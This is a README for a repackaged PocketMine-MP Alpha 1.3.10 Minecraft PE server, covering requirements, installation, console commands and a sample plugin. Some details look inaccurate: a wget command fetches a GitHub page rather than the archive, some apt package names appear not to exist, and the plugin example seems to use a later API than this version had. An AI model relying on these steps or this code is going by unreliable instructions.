# PocketMine-MP Alpha 1.3.10

A Minecraft Pocket Edition server software written in PHP that allows you to create and manage Minecraft PE servers with plugin support.

![PocketMine-MP](https://pmmp.io/assets/images/favicon.png)

## Overview

PocketMine-MP Alpha 1.3.10 is a server software for Minecraft Pocket Edition (v0.7.6 alpha) written in PHP. It features a Plugin API that enables developers to extend functionality and add new features or modify default behaviors. The entire server is written in PHP and has been tested, profiled, and optimized for smooth performance.

## Features

- **🧩 Powerful Plugin API**: Extend and customise gameplay as you see fit
- **🗺️ Rich Ecosystem**: Large developer community with easy-to-find plugins
- **🌐 Multi-world Support**: Offer varied game experiences without transferring players
- **🏎️ Performance**: Optimized for smooth gameplay with multiple players
- **⤴️ Stable Release**: Alpha 1.3.10 is a stable version for Minecraft PE v0.7.6
- **🔧 Customizable**: Full control over server functions and customization
- **📚 Comprehensive Documentation**: Extensive guides and API documentation

## System Requirements

### Minimum Requirements

- **PHP**: 5.4.0 or higher (5.5+ recommended)
- **Operating System**: Windows, Linux, or macOS
- **Memory**: 128MB RAM minimum (256MB+ recommended)
- **Storage**: 100MB free space

### Required PHP Extensions

The following PHP extensions must be installed and enabled:

- **sockets**: For network communication
- **curl**: For HTTP requests and updates
- **sqlite3**: For data storage
- **zlib**: For compression
- **bcmath**: For mathematical operations (optional but recommended)

### Optional Extensions

- **pthreads**: For multi-threading support (experimental)

## Installation

### Method 1: Using the Installer (Recommended)

1. Download the PocketMine-MP Alpha 1.3.10 installer from [GitHub](https://github.com/TheCreateGM/PocketMine-MP-Alpha_1.3.10/blob/main/PocketMine-MP-Alpha_1.3.10.zip)
2. Run the installer and follow the setup wizard
3. The installer will automatically download and configure PHP with required extensions

### Method 2: Manual Installation

#### Linux/macOS

1. **Install PHP and required extensions:**
   ```bash
   # Ubuntu/Debian
   sudo apt-get update
   sudo apt-get install php5-cli php5-sockets php5-curl php5-sqlite3 php5-zlib php5-bcmath
   
   # CentOS/RHEL/Fedora
   sudo yum install php-cli php-sockets php-curl php-sqlite3 php-zlib php-bcmath
   
   # macOS (using Homebrew)
   brew install php
   ```

2. **Download and extract PocketMine-MP Alpha 1.3.10:**
   ```bash
   # Download the specific version
   wget https://github.com/TheCreateGM/PocketMine-MP-Alpha_1.3.10/blob/main/PocketMine-MP-Alpha_1.3.10.zip
   unzip PocketMine-MP-Alpha_1.3.10.zip
   cd PocketMine-MP-Alpha_1.3.10
   ```

3. **Make the start script executable:**
   ```bash
   chmod +x start.sh
   ```

4. **Start the server:**
   ```bash
   ./start.sh
   ```

#### Windows

1. **Install PHP:**
   - Download PHP 5.5+ from [php.net](https://www.php.net/downloads.php)
   - Extract to a folder (e.g., `C:\php`)
   - Add PHP to your system PATH

2. **Enable required extensions:**
   - Edit `php.ini` and uncomment the following lines:
     ```ini
     extension=sockets
     extension=curl
     extension=sqlite3
     extension=zlib
     extension=bcmath
     ```

3. **Download and extract PocketMine-MP Alpha 1.3.10:**
   - Download `PocketMine-MP-Alpha_1.3.10.zip` from [GitHub Releases](https://github.com/TheCreateGM/PocketMine-MP-Alpha_1.3.10/blob/main/PocketMine-MP-Alpha_1.3.10.zip)
   - Extract the ZIP file to your desired location
   - Open Command Prompt in the PocketMine-MP-Alpha_1.3.10 folder

4. **Start the server:**
   ```cmd
   start.cmd
   ```

## Configuration

### Server Configuration

The main server configuration is located in `src/config.php`. Key settings include:

- **Memory Limit**: Default 128MB (can be increased for larger servers)
- **API Version**: 10
- **Minecraft Version**: Compatible with v0.7.6 alpha
- **PHP Version**: Requires 5.4.0+ (5.5+ recommended)
- **Timezone**: Automatically detected

### World Configuration

Worlds are stored in the `worlds/` directory. Each world has its own configuration file.

### Plugin Configuration

Plugins are stored in the `plugins/` directory. Each plugin may have its own configuration file.

## Usage

### Starting the Server

#### Linux/macOS
```bash
./start.sh
```

#### Windows
```cmd
start.cmd
```

### Server Commands

Once the server is running, you can use various console commands:

- `help` - Show available commands
- `stop` - Stop the server
- `save-all` - Save all worlds
- `save-on` - Enable auto-save
- `save-off` - Disable auto-save
- `list` - List online players
- `kick <player>` - Kick a player
- `ban <player>` - Ban a player
- `op <player>` - Give operator status
- `deop <player>` - Remove operator status

### Connecting to the Server

1. Start the PocketMine-MP server
2. Note the server IP and port (default: 19132)
3. In Minecraft PE, go to "Play" → "Edit" → "External"
4. Add the server with the IP and port
5. Connect to the server

## Plugin Development

PocketMine-MP provides a comprehensive Plugin API for extending server functionality. Plugins are written in PHP and can:

- Add new commands
- Handle player events
- Modify game mechanics
- Add new blocks and items
- Create custom worlds

### Basic Plugin Structure

```php
<?php
namespace MyPlugin;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;

class Main extends PluginBase implements Listener {
    
    public function onEnable() {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        $this->getLogger()->info("MyPlugin has been enabled!");
    }
    
    public function onPlayerJoin(PlayerJoinEvent $event) {
        $player = $event->getPlayer();
        $player->sendMessage("Welcome to the server!");
    }
}
```

## Troubleshooting

### Common Issues

1. **"Unable to find the Socket extension"**
   - Install the PHP sockets extension
   - Enable it in php.ini

2. **"Unable to find the cURL extension"**
   - Install the PHP curl extension
   - Enable it in php.ini

3. **"Unable to find the SQLite3 extension"**
   - Install the PHP sqlite3 extension
   - Enable it in php.ini

4. **"Use PHP >= 5.4.0"**
   - Upgrade to PHP 5.4.0 or higher

5. **"You must run PocketMine-MP using the CLI"**
   - Run the server from command line, not through a web server

### Performance Optimization

- Increase `memory_limit` in php.ini for larger servers
- Use SSD storage for better world loading performance
- Optimize world generation settings
- Use plugins sparingly to reduce overhead

## Directory Structure

```
PocketMine-MP-Alpha_1.3.10/
├── src/                    # Source code
│   ├── API/               # Plugin API
│   ├── material/          # Block and item definitions
│   ├── world/             # World management
│   ├── network/           # Network protocol
│   ├── utils/             # Utility classes
│   └── config.php         # Main configuration
├── plugins/               # Plugin directory
├── worlds/                # World data
├── players/               # Player data
├── start.sh              # Linux/macOS start script
├── start.cmd             # Windows start script
└── PocketMine-MP.php     # Main server file
```

## License

This project is licensed under the GNU Lesser General Public License v3.0. See the [LICENSE](LICENSE) file for details.

## Support

- **Homepage**: [pmmp.io](https://pmmp.io/)
- **Documentation**: [Official Documentation](http://pmmp.readthedocs.org/)
- **Installation Guide**: [Installation](https://pmmp.readthedocs.io/en/rtfd/installation.html)
- **API Documentation**: [API Docs](https://apidoc.pmmp.io)
- **Developer Documentation**: [Dev Docs](https://devdoc.pmmp.io)
- **Discord**: [PocketMine Discord](https://discord.gg/bmSAZBG)
- **GitHub**: [PocketMine-MP Repository](https://github.com/pmmp/PocketMine-MP)
- **Poggit**: [Plugin Repository](https://poggit.pmmp.io/plugins)
- **Stack Overflow**: [Questions & Answers](https://stackoverflow.com/tags/pocketmine)

## Contributing

Contributions are welcome! Please read the [CONTRIBUTING.md](CONTRIBUTING.md) file for details on how to submit pull requests.

## Third-Party Libraries

PocketMine-MP uses the following third-party libraries:

- **PHP Sockets**: [Network communication](https://www.php.net/manual/en/book.sockets.php)
- **PHP SQLite3**: [Data storage](https://www.php.net/manual/en/book.sqlite3.php)
- **PHP BCMath**: [Mathematical operations](https://www.php.net/manual/en/book.bc.php)
- **PHP pthreads**: [Threading support](https://github.com/krakjoe/pthreads)
- **Spyc**: [YAML parsing](https://github.com/mustangostang/spyc)
- **cURL**: [HTTP requests](https://curl.se/)
- **Zlib**: [Compression](https://www.zlib.net/)
- **Source RCON Protocol**: [Remote console](https://developer.valvesoftware.com/wiki/Source_RCON_Protocol)
- **UT3 Query Protocol**: [Server queries](http://wiki.unrealadmin.org/UT3_query_protocol)

## Version Information

- **Current Version**: Alpha 1.3.10
- **Minecraft PE Version**: v0.7.6 alpha
- **API Version**: 10
- **Required PHP Version**: 5.4.0+
- **Recommended PHP Version**: 5.5+
- **Memory Limit**: 128MB default
- **License**: LGPL-3.0 